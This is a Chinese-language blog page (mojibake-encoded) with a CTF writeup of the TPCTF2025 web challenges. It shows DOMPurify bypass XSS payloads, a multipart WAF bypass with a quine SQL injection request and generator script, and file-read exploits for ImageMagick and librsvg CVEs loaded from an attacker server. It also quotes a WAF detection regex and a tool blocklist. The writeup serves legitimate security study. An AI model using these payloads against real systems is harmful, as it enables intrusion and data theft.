<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>TPCTF2025-Web-èµ›åå¤ç°Writeup | Xrntkk&#39;s Blog</title>
<meta name="keywords" content="writeup, ctf, Web">
<meta name="description" content="
å‚è€ƒæ–‡ç« 
https://blog.0xfff.team/posts/tpctf_2025_writeup/
https://z3n1th1.com/2025/03/tpctf2025-writeup/
TPCTF2025 Writeup - æ˜Ÿç›Ÿå®‰å…¨å›¢é˜Ÿ
baby layout
è¿™æ˜¯ä¸€é“å…³äºç»•è¿‡DOMPurifyåº“ï¼Œè¿›è¡Œxss cookieçªƒå–çš„é¢˜ç›®
DOMPurify æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨äºæ¸…ç† HTML è¾“å…¥çš„ JavaScript åº“ï¼Œæ—¨åœ¨é˜²æ­¢è·¨ç«™è„šæœ¬ (XSS) æ”»å‡»ã€‚å®ƒé€šè¿‡è¿‡æ»¤å’Œå‡€åŒ–ç”¨æˆ·æä¾›çš„ HTML å†…å®¹ï¼Œç¡®ä¿å…¶å®‰å…¨åœ°åµŒå…¥åˆ°ç½‘é¡µä¸­ï¼Œé¿å…æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚">
<meta name="author" content="Xrntkk">
<link rel="canonical" href="http://localhost:1313/post/tpctf_2025/">

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <meta name="referrer" content="no-referrer-when-downgrade">
<link crossorigin="anonymous" href="/assets/css/stylesheet.3fcf74ad9d359e0c6c3d2b51a42f684a692fd9cd053c3829756ad5f3e4c4649b.css" integrity="sha256-P890rZ01ngxsPStRpC9oSmkv2c0FPDgpdWrV8&#43;TEZJs=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="http://localhost:1313/post/tpctf_2025/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="http://localhost:1313/post/tpctf_2025/">
  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
  <meta property="og:title" content="TPCTF2025-Web-èµ›åå¤ç°Writeup">
  <meta property="og:description" content=" å‚è€ƒæ–‡ç« 
https://blog.0xfff.team/posts/tpctf_2025_writeup/
https://z3n1th1.com/2025/03/tpctf2025-writeup/
TPCTF2025 Writeup - æ˜Ÿç›Ÿå®‰å…¨å›¢é˜Ÿ
baby layout è¿™æ˜¯ä¸€é“å…³äºç»•è¿‡DOMPurifyåº“ï¼Œè¿›è¡Œxss cookieçªƒå–çš„é¢˜ç›®
DOMPurify æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨äºæ¸…ç† HTML è¾“å…¥çš„ JavaScript åº“ï¼Œæ—¨åœ¨é˜²æ­¢è·¨ç«™è„šæœ¬ (XSS) æ”»å‡»ã€‚å®ƒé€šè¿‡è¿‡æ»¤å’Œå‡€åŒ–ç”¨æˆ·æä¾›çš„ HTML å†…å®¹ï¼Œç¡®ä¿å…¶å®‰å…¨åœ°åµŒå…¥åˆ°ç½‘é¡µä¸­ï¼Œé¿å…æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚">
  <meta property="og:locale" content="zh">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2025-03-15T00:27:55+08:00">
    <meta property="article:modified_time" content="2025-03-15T00:27:55+08:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="Ctf">
    <meta property="article:tag" content="Web">
      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:title" content="TPCTF2025-Web-èµ›åå¤ç°Writeup">
<meta name="twitter:description" content="
å‚è€ƒæ–‡ç« 
https://blog.0xfff.team/posts/tpctf_2025_writeup/
https://z3n1th1.com/2025/03/tpctf2025-writeup/
TPCTF2025 Writeup - æ˜Ÿç›Ÿå®‰å…¨å›¢é˜Ÿ
baby layout
è¿™æ˜¯ä¸€é“å…³äºç»•è¿‡DOMPurifyåº“ï¼Œè¿›è¡Œxss cookieçªƒå–çš„é¢˜ç›®
DOMPurify æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨äºæ¸…ç† HTML è¾“å…¥çš„ JavaScript åº“ï¼Œæ—¨åœ¨é˜²æ­¢è·¨ç«™è„šæœ¬ (XSS) æ”»å‡»ã€‚å®ƒé€šè¿‡è¿‡æ»¤å’Œå‡€åŒ–ç”¨æˆ·æä¾›çš„ HTML å†…å®¹ï¼Œç¡®ä¿å…¶å®‰å…¨åœ°åµŒå…¥åˆ°ç½‘é¡µä¸­ï¼Œé¿å…æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "TPCTF2025-Web-èµ›åå¤ç°Writeup",
      "item": "http://localhost:1313/post/tpctf_2025/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "TPCTF2025-Web-èµ›åå¤ç°Writeup",
  "name": "TPCTF2025-Web-èµ›åå¤ç°Writeup",
  "description": " å‚è€ƒæ–‡ç« \nhttps://blog.0xfff.team/posts/tpctf_2025_writeup/\nhttps://z3n1th1.com/2025/03/tpctf2025-writeup/\nTPCTF2025 Writeup - æ˜Ÿç›Ÿå®‰å…¨å›¢é˜Ÿ\nbaby layout è¿™æ˜¯ä¸€é“å…³äºç»•è¿‡DOMPurifyåº“ï¼Œè¿›è¡Œxss cookieçªƒå–çš„é¢˜ç›®\nDOMPurify æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨äºæ¸…ç† HTML è¾“å…¥çš„ JavaScript åº“ï¼Œæ—¨åœ¨é˜²æ­¢è·¨ç«™è„šæœ¬ (XSS) æ”»å‡»ã€‚å®ƒé€šè¿‡è¿‡æ»¤å’Œå‡€åŒ–ç”¨æˆ·æä¾›çš„ HTML å†…å®¹ï¼Œç¡®ä¿å…¶å®‰å…¨åœ°åµŒå…¥åˆ°ç½‘é¡µä¸­ï¼Œé¿å…æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚\n",
  "keywords": [
    "writeup", "ctf", "Web"
  ],
  "articleBody": " å‚è€ƒæ–‡ç« \nhttps://blog.0xfff.team/posts/tpctf_2025_writeup/\nhttps://z3n1th1.com/2025/03/tpctf2025-writeup/\nTPCTF2025 Writeup - æ˜Ÿç›Ÿå®‰å…¨å›¢é˜Ÿ\nbaby layout è¿™æ˜¯ä¸€é“å…³äºç»•è¿‡DOMPurifyåº“ï¼Œè¿›è¡Œxss cookieçªƒå–çš„é¢˜ç›®\nDOMPurify æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨äºæ¸…ç† HTML è¾“å…¥çš„ JavaScript åº“ï¼Œæ—¨åœ¨é˜²æ­¢è·¨ç«™è„šæœ¬ (XSS) æ”»å‡»ã€‚å®ƒé€šè¿‡è¿‡æ»¤å’Œå‡€åŒ–ç”¨æˆ·æä¾›çš„ HTML å†…å®¹ï¼Œç¡®ä¿å…¶å®‰å…¨åœ°åµŒå…¥åˆ°ç½‘é¡µä¸­ï¼Œé¿å…æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚\nåœ¨è¿™é“é¢˜ä¸­è°ƒç”¨äº†DOMPurifyåº“å¯¹content è¿›è¡Œ HTML å†…å®¹çš„å‡€åŒ–ï¼Œä»¥é˜²æ­¢ XSS æ”»å‡»ï¼Œè€Œä¸”å°†å‡€åŒ–åçš„å†…å®¹æ›¿æ¢åˆ° layout å­—ç¬¦ä¸²ä¸­ç‰¹å®šçš„å ä½ç¬¦ {{content}} å¤„\nå¦å¤–åœ¨ä¸‹è¾¹çš„åˆ›å»ºLayoutå¤„ä¹Ÿä¼šè°ƒç”¨DOMPurifyåº“çš„sanitize\nsanitizeçš„å·¥ä½œåŸç†å¤§è‡´å¦‚ä¸‹\né‚£æ—¢ç„¶è¿™ä¸¤è¾¹éƒ½è¢«è¿›è¡Œäº†å†…å®¹çš„å‡€åŒ–ï¼Œéš¾ä»¥ç›´æ¥è¿›è¡Œxssï¼Œé‚£æˆ‘ä»¬æ˜¯å¦å¯ä»¥é€šè¿‡ä¸¤è€…ç»“åˆçš„æ–¹å¼è¿›è¡Œxsså‘¢\nå…ˆå°è¯•ä¸€ä¸‹è¿™ä¸ª\nlayoutï¼š\rcontentï¼š\ralert(1) å‘ç°ä¸è¡Œï¼Œå› ä¸ºå½“ä¼ å…¥çš„å†…å®¹ä¸ºhtmlçš„æ—¶å€™DOMPurifyä¼šå¯¹å…¶ä¸­çš„å…ƒç´ è¿›è¡Œè§£æï¼Œå…¶ä¸­onerrorä¸ºå±é™©å±æ€§æ‰€æœ‰è¢«å‡€åŒ–æ‰äº†\næ‰€ä»¥layoutå˜æˆäº†\nä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„å†…å®¹ä¸ä¸ºhtmlç»“æ„çš„æ—¶å€™ï¼ŒDOMPurifyæ— æ³•å¯¹å…ƒç´ è¿›è¡Œè§£æå’Œå‡€åŒ–ï¼Œæ˜¯å¯ä»¥æ­£å¸¸ä¼ å…¥onerrorçš„\næ‰€ä»¥å¯ä»¥è¿™æ ·æ„é€ payload\nlayoutï¼š\rcontentï¼š\r1\" onerror=\"alert(1) safe-layout è¿™é¢˜å’Œä¸Šä¸€é¢˜çš„åŒºåˆ«æ˜¯å¢åŠ äº†ALLOWED_ATTR: []\nconst sanitizedContent = DOMPurify.sanitize(content, { ALLOWED_ATTR: [] }); ä¸€ä¸ªç±»ä¼¼ç™½åå•çš„ä¸œè¥¿ã€‚\nä½†æ˜¯è¿™ç©æ„å…¶å®å¹¶ä¸æ˜¯ç™½åå•ï¼Œè™½ç„¶è¯´ç¦ç”¨äº†æ‰€æœ‰çš„å±æ€§ï¼Œä½†æ˜¯data-*å’Œaira-*å±æ€§è¿˜æ˜¯å¯ä»¥æ­£å¸¸ä½¿ç”¨çš„\nè¿™ç¯‡æ–‡ç« ä¸­æœ‰æåˆ°ï¼š\nhttps://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists\næ‰€ä»¥å¯ä»¥æ„é€ å‡ºpayload\ncontent\n123\" onload=\"alert(1) layout\næˆ–è€…æ˜¯\nlayout\nsafe layout revenge è¿™é¢˜æŠŠä¸Šé¢˜ä¸­ä½¿ç”¨çš„aria-*å’Œdata-*ç»™banæ‰äº†\nè¿˜æ˜¯çœ‹ä¸Šé¢˜ä¸­çš„é‚£ç¯‡æ–‡ç« \nhttps://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#cve-2023-48219-tinymce\nåœ¨è¿™ç¯‡æ–‡ç« ä¸­æåˆ°çš„CVE-2023-48219ä¸­ï¼Œä¼šåœ¨DOMpurifyåå°†\\uFFFFæ›¿æ¢ä¸ºç©ºã€‚\næ‰€ä»¥è¿™é‡Œå¯ä»¥åˆ©ç”¨\\uFEFFå¯¹htmlä»£ç è¿›è¡Œæˆªæ–­ï¼Œä»è€Œç»•è¿‡DOMpurify\nå›åˆ°è¿™é“é¢˜ï¼Œæˆ‘ä»¬è¿™é‡Œä¹Ÿå¯ä»¥è¾¾åˆ°ç±»ä¼¼çš„æ•ˆæœã€‚æˆ‘ä»¬å¯ä»¥ç”¨{{content}}æ¥ä»£æ›¿\\uFEFFå¯¹htmlè¿›è¡Œæˆªæ–­ã€‚\næ‰€ä»¥payloadå°±æ˜¯\n//contentä¸ºç©º\rlayoutï¼š\rx supersqli è€ƒç‚¹ï¼šè§£æå·®å¼‚ç»•è¿‡å’Œquineæ³¨å…¥\næ‹¿åˆ°é™„ä»¶\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é“é¢˜ç”¨goå®ç°äº†ä¸€ä¸ªåå‘ä»£ç†å’ŒWAF\n1var sqlInjectionPattern = regexp.MustCompile(`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\\s+table|--|#|\\*\\/|\\/\\*)`) 2 3var rcePattern = regexp.MustCompile(`(?i)(\\b(?:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert)\\s*\\(.+\\))`) 4 5var hotfixPattern = regexp.MustCompile(`(?i)(select)`) 6 7var blockedUserAgents = []string{ 8\t\"sqlmap\", 9\t\"nmap\", 10\t\"curl\", 11} å†çœ‹åˆ°urls.py\n1from django.contrib import admin 2from django.urls import path 3from blog import views 4 5urlpatterns = [ 6 path(\"flag/\", views.flag, name=\"flag\"), 7 path(\"\", views.index, name=\"index\"), 8] å®šä¹‰äº†ä¸€ä¸ªflagè·¯ç”±ï¼ŒæŒ‡å‘views.pyçš„flagå‡½æ•°\nè·Ÿè¿›views\n1from django.shortcuts import render 2from django.db import connection 3 4# Create your views here. 5from django.http import HttpResponse,HttpRequest 6from .models import AdminUser,Blog 7import os 8 9def index(request:HttpRequest): 10 return HttpResponse('Welcome to TPCTF 2025') 11 12def flag(request:HttpRequest): 13 if request.method != 'POST': 14 return HttpResponse('Welcome to TPCTF 2025') 15 username = request.POST.get('username') 16 if username != 'admin': 17 return HttpResponse('you are not admin.') 18 password = request.POST.get('password') 19 users:AdminUser = AdminUser.objects.raw(\"SELECT * FROM blog_adminuser WHERE username='%s' and password ='%s'\" % (username,password)) 20 try: 21 assert password == users[0].password 22 return HttpResponse(os.environ.get('FLAG')) 23 except: 24 return HttpResponse('wrong password') è¿™é‡Œå­˜åœ¨sqlæ³¨å…¥\næ‰€ä»¥æ¥ä¸‹æ¥çš„ç›®æ ‡å°±æ˜¯è¦æƒ³åŠæ³•ç»•è¿‡wafï¼Œè¿›è¡Œsqlæ³¨å…¥\nå¯ä»¥åˆ©ç”¨multipart boundaryæ¥ç»•è¿‡wafï¼Œå‚è€ƒä¸‹é¢çš„è¿™ç¯‡æ–‡ç« \nhttps://www.geekby.site/2022/03/waf-bypass/#multipart-%E6%B7%B7%E6%B7%86\n1POST /flag/ HTTP/1.1 2Host: 127.0.0.1:7788 3sec-ch-ua-mobile: ?0 4Sec-Fetch-Site: cross-site 5Upgrade-Insecure-Requests: 1 6Sec-Fetch-Dest: document 7sec-ch-ua-platform: \"Windows\" 8sec-ch-ua: \"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\" 9Referer: http://mitm/ 10Sec-Fetch-Mode: navigate 11Sec-Fetch-User: ?1 12Accept-Language: zh-CN,zh;q=0.9 13User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 14Accept-Encoding: gzip, deflate, br, zstd 15Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 16Content-Type: multipart/form-data; boundary=a 17 18--a 19Content-Disposition: form-data; name=\"username\" 20 21admin 22--a 23Content-Disposition: form-data; name=\"password\";filename=\"password\" 24Content-Disposition: form-data; name=\"password\"; 25 26123 27--a-- è¿™é¢˜æˆ‘ä»¬å¯ä»¥ä½¿ç”¨quineæ³¨å…¥ï¼Œå³æ„é€ sqlè¯­å¥ä½¿æˆ‘ä»¬è¾“å…¥å’Œè¾“å‡ºçš„ç»“æœä¸€è‡´ï¼Œä»è€Œç»•è¿‡\n1assert password == users[0].password å‚è€ƒæ–‡ç« ï¼š\nhttps://www.cnblogs.com/meraklbz/p/18169584\nç”Ÿæˆä¸€ä¸ªpayload\n1def quine(data, debug=True): 2 if debug: 3 print(data) 4 data = data.replace('$$',\"REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)\") 5 blob = data.replace('$$','\"$\"').replace(\"'\",'\"') 6 data = data.replace('$$',\"'\"+blob+\"'\") 7 if debug: 8 print (data) 9 return data 10 11data = quine(\"1' union select 1,2,$$--\") å®Œæ•´payload\n1POST /flag/ HTTP/1.1 2Host: 127.0.0.1:7788 3sec-ch-ua-mobile: ?0 4Sec-Fetch-Site: cross-site 5Upgrade-Insecure-Requests: 1 6Sec-Fetch-Dest: document 7sec-ch-ua-platform: \"Windows\" 8sec-ch-ua: \"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\" 9Referer: http://mitm/ 10Sec-Fetch-Mode: navigate 11Sec-Fetch-User: ?1 12Accept-Language: zh-CN,zh;q=0.9 13User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 14Accept-Encoding: gzip, deflate, br, zstd 15Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 16Content-Type: multipart/form-data; boundary=a 17 18--a 19Content-Disposition: form-data; name=\"username\" 20 21admin 22--a 23Content-Disposition: form-data; name=\"password\";filename=\"password\" 24Content-Disposition: form-data; name=\"password\"; 25 261' union select 1,2,REPLACE(REPLACE('1\" union select 1,2,REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\")--',CHAR(34),CHAR(39)),CHAR(36),'1\" union select 1,2,REPLACE(REPLACE(\"$\",CHAR(34),CHAR(39)),CHAR(36),\"$\")--')-- 27--a-- thumbor1 thumboræ˜¯ä¸€ä¸ªå›¾ç‰‡å¤„ç†æœåŠ¡å·¥å…·ï¼Œå¯ä»¥å¯¹å›¾ç‰‡è¿›è¡ŒåŠ¨æ€è°ƒæ•´\né™„ä»¶åªæœ‰ä¸€ä¸ªdockerfile\nå¯ä»¥èµ·ä¸ªdockeræ‹¿ä¸€ä¸‹æºç \nè¿™é¢˜ä¸æ˜¯å› ä¸ºthumboræœ‰é—®é¢˜ï¼Œè€Œæ˜¯å› ä¸ºthumborçš„ä¸€ä¸ªç»„ä»¶ImageMagickå­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œä¹Ÿå°±æ˜¯CVE-2022-44268ã€‚\nå»GitHubæ‰¾ä¸€ä¸ªPOC\nvoidz0r/CVE-2022-44268: A PoC for the CVE-2022-44268 - ImageMagick arbitrary file read\nä»readmeå¯ä»¥çœ‹åˆ°è¿™é‡Œå¯ä»¥é€šè¿‡ç±»ä¼¼ssrfçš„æ–¹å¼è¿œç¨‹åŠ è½½å›¾ç‰‡\nåœ¨vpsä¸Šæ„é€ å¥½pngï¼Œè¿œç¨‹åŠ è½½å³å¯\nhttp://localhost:8800/thumbor/unsafe/450x/YOUR_IP/å›¾ç‰‡ å…¶å®å°±æ˜¯å¤ç°cve\nthumbor2 dockerfileé‡Œé¢å¢åŠ äº†æœ€æ–°ç‰ˆçš„ImageMagickï¼Œå…¶å®å°±æ˜¯ä¿®å¤äº†ä¸Šä¸€é¢˜çš„ImageMagick\nè¿™é¢˜æ˜¯å¦ä¸€ä¸ªç»„ä»¶librsvgçš„æ¼æ´ï¼ŒCVE-2023-38633\nlibrsvg 2.56.3 ä¹‹å‰ç‰ˆæœ¬ä¸­ URL è§£ç å™¨çš„ç›®å½•éå†é—®é¢˜ï¼Œå¯ä»¥è¢«æœ¬åœ°æˆ–è¿œç¨‹æ”»å‡»è€…ç”¨æ¥æ³„éœ²æ–‡ä»¶ï¼ˆåœ¨é¢„æœŸåŒºåŸŸä¹‹å¤–çš„æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸Šï¼‰ï¼Œä¾‹å¦‚é€šè¿‡åœ¨ xi:include å…ƒç´ ä¸­ä½¿ç”¨ href=â€œ.?../â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/â€¦/etc/passwdâ€ æ¥è¯»å–ç»“æœã€‚ åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/HMX404/article/details/137231580\nåŸç†å‚è€ƒæ–‡ç« ï¼š\nWhen URL parsers disagree (CVE-2023-38633) - Canva Engineering Blog\npayloadï¼š\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e file not found è·Ÿä¸Šé¢˜å·®ä¸å¤šï¼Œåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªtxtï¼Œå°†payloadå†™è¿›å»ï¼Œè¿œç¨‹åŠ è½½å³å¯\nhttp://localhost:8800/thumbor/unsafe/450x/YOUR_IP/poc.txt ",
  "wordCount" : "2027",
  "inLanguage": "zh",
  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2025-03-15T00:27:55+08:00",
  "dateModified": "2025-03-15T00:27:55+08:00",
  "author":{
    "@type": "Person",
    "name": "Xrntkk"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/post/tpctf_2025/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Xrntkk's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
                    <span>é¦–é¡µğŸ“”</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="å½’æ¡£">
                    <span>å½’æ¡£ğŸ—ƒï¸</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>æ ‡ç­¾ğŸ”–</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="æœç´¢">
                    <span>æœç´¢ğŸ”</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/links/" title="å‹é“¾ğŸˆ">
                    <span>å‹é“¾ğŸˆ</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/about/" title="å…³äº">
                    <span>å…³äºğŸ‘¨â€ğŸ’»</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      TPCTF2025-Web-èµ›åå¤ç°Writeup
    </h1>
<div class="post-meta"><span title='2025-03-15 00:27:55 +0800 CST'>2025-03-15</span>&nbsp;Â·&nbsp;5 åˆ†é’Ÿ&nbsp;Â·&nbsp;Xrntkk

<div class="meta-item">&nbspÂ·&nbsp
  <span id="busuanzi_container_page_pv">Readings: <span id="busuanzi_value_page_pv"></span></span>
  </div>      
</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">ç›®å½•</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#baby-layout" aria-label="baby layout">baby layout</a></li>
                <li>
                    <a href="#safe-layout" aria-label="safe-layout">safe-layout</a></li>
                <li>
                    <a href="#safe-layout-revenge" aria-label="safe layout revenge">safe layout revenge</a></li>
                <li>
                    <a href="#supersqli" aria-label="supersqli">supersqli</a></li>
                <li>
                    <a href="#thumbor1" aria-label="thumbor1">thumbor1</a></li>
                <li>
                    <a href="#thumbor2" aria-label="thumbor2">thumbor2</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><blockquote>
<p>å‚è€ƒæ–‡ç« </p>
<p><a href="https://blog.0xfff.team/posts/tpctf_2025_writeup/">https://blog.0xfff.team/posts/tpctf_2025_writeup/</a></p>
<p><a href="https://z3n1th1.com/2025/03/tpctf2025-writeup/">https://z3n1th1.com/2025/03/tpctf2025-writeup/</a></p>
<p><a href="https://blog.xmcve.com/2025/03/11/TPCTF2025-Writeup/">TPCTF2025 Writeup - æ˜Ÿç›Ÿå®‰å…¨å›¢é˜Ÿ</a></p></blockquote>
<h3 id="baby-layout">baby layout<a hidden class="anchor" aria-hidden="true" href="#baby-layout">#</a></h3>
<p>è¿™æ˜¯ä¸€é“å…³äºç»•è¿‡DOMPurifyåº“ï¼Œè¿›è¡Œxss cookieçªƒå–çš„é¢˜ç›®</p>
<p>DOMPurify æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨äºæ¸…ç† HTML è¾“å…¥çš„ JavaScript åº“ï¼Œæ—¨åœ¨é˜²æ­¢è·¨ç«™è„šæœ¬ (XSS) æ”»å‡»ã€‚å®ƒé€šè¿‡è¿‡æ»¤å’Œå‡€åŒ–ç”¨æˆ·æä¾›çš„ HTML å†…å®¹ï¼Œç¡®ä¿å…¶å®‰å…¨åœ°åµŒå…¥åˆ°ç½‘é¡µä¸­ï¼Œé¿å…æ¶æ„ä»£ç çš„æ‰§è¡Œã€‚</p>
<p><img alt="image-20250310143030190" loading="lazy" src="../assets/image-20250310143030190.png"></p>
<p>åœ¨è¿™é“é¢˜ä¸­è°ƒç”¨äº†DOMPurifyåº“å¯¹<code>content</code> è¿›è¡Œ HTML å†…å®¹çš„å‡€åŒ–ï¼Œä»¥é˜²æ­¢ XSS æ”»å‡»ï¼Œè€Œä¸”å°†å‡€åŒ–åçš„å†…å®¹æ›¿æ¢åˆ° <code>layout</code> å­—ç¬¦ä¸²ä¸­ç‰¹å®šçš„å ä½ç¬¦ <code>{{content}}</code> å¤„</p>
<p><img alt="image-20250310142621214" loading="lazy" src="../assets/image-20250310142621214.png"></p>
<p>å¦å¤–åœ¨ä¸‹è¾¹çš„åˆ›å»ºLayoutå¤„ä¹Ÿä¼šè°ƒç”¨DOMPurifyåº“çš„sanitize</p>
<p><img alt="image-20250310143353939" loading="lazy" src="../assets/image-20250310143353939.png"></p>
<p>sanitizeçš„å·¥ä½œåŸç†å¤§è‡´å¦‚ä¸‹</p>
<p><img alt="image-20250310222515042" loading="lazy" src="../assets/image-20250310222515042.png"></p>
<p>é‚£æ—¢ç„¶è¿™ä¸¤è¾¹éƒ½è¢«è¿›è¡Œäº†å†…å®¹çš„å‡€åŒ–ï¼Œéš¾ä»¥ç›´æ¥è¿›è¡Œxssï¼Œé‚£æˆ‘ä»¬æ˜¯å¦å¯ä»¥é€šè¿‡ä¸¤è€…ç»“åˆçš„æ–¹å¼è¿›è¡Œxsså‘¢</p>
<p>å…ˆå°è¯•ä¸€ä¸‹è¿™ä¸ª</p>
<pre tabindex="0"><code>layoutï¼š
&lt;img src onerror=&#34;{{content}}&#34;&gt;

contentï¼š
alert(1)
</code></pre><p>å‘ç°ä¸è¡Œï¼Œå› ä¸ºå½“ä¼ å…¥çš„å†…å®¹ä¸ºhtmlçš„æ—¶å€™DOMPurifyä¼šå¯¹å…¶ä¸­çš„å…ƒç´ è¿›è¡Œè§£æï¼Œå…¶ä¸­onerrorä¸ºå±é™©å±æ€§æ‰€æœ‰è¢«å‡€åŒ–æ‰äº†</p>
<p>æ‰€ä»¥layoutå˜æˆäº†</p>
<pre tabindex="0"><code>&lt;img src=1 &gt;
</code></pre><p><img alt="image-20250310150425084" loading="lazy" src="../assets/image-20250310150425084.png"></p>
